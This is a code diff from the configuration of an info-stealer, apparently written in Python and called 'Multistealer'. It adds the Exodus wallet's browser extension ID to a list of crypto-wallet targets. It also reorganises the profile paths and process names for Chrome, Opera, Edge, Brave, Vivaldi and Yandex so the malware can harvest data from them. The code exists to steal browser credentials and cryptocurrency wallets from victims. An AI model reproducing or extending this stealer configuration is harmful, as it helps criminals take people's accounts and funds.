@@ -55,6 +55,10 @@ class ChromiumConfig:
         {
             "name": "Trust",
             "folders": ["egjidjbpglichdcondbcbdnbeeppgdph"]
+        },
+        {
+            "name": "Exodus",
+            "folders": ["aholpfdialjgjfhomihkjbmgjidlcdno"]
         }
     ]
 
@@ -62,50 +66,38 @@ class ChromiumConfig:
 class MultistealerConfig:
 
     PoolSize = 5
-
     ZipName = f"{user}-st"
 
-    ChromePaths = (
-        rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State",
-        rf"{user_profile}\AppData\Local\Google\Chrome\User Data",
-        "chrome.exe"
-    )
-
-    OperaGXPaths = (
-        rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable\Local State",
-        rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable",
-        "opera.exe"
-    )
-
-    OperaDefaultPaths = (
-        rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable\Local State",
-        rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable",
-        "opera.exe"
-    )
-
-    MicrosoftEdgePaths = (
-        rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data\Local State",
-        rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data",
-        "msedge.exe"
-    )
-
-    BravePaths = (
-        rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State",
-        rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
-        "brave.exe"
-    )
-
-    VivaldiPaths = (
-        rf"{user_profile}\AppData\Local\Vivaldi\User Data\Local State",
-        rf"{user_profile}\AppData\Local\Vivaldi\User Data",
-        "vivaldi.exe"
-    )
-
-    YandexPaths = (
-        rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data\Local State",
-        rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data",
-        "browser.exe"
-    )
+    BrowsersData = {
+        Browsers.CHROME: {
+            "path": rf"{user_profile}\AppData\Local\Google\Chrome\User Data",
+            "process": "chrome.exe"
+        },
+        Browsers.OPERA_GX: {
+            "path": rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable",
+            "process": "opera.exe"
+        },
+        Browsers.OPERA_DEFAULT: {
+            "path": rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable",
+            "process": "opera.exe"
+        },
+        Browsers.EDGE: {
+            "path": rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data",
+            "process": "msedge.exe"
+        },
+        Browsers.BRAVE: {
+            "path": rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
+            "process": "brave.exe"
+        },
+        Browsers.VIVALDI: {
+            "path": rf"{user_profile}\AppData\Local\Vivaldi\User Data",
+            "process": "vivaldi.exe"
+        },
+        Browsers.YANDEX: {
+            "path": rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data",
+            "process": "browser.exe"
+        },
+    }
 
 
 class SystemConfig:
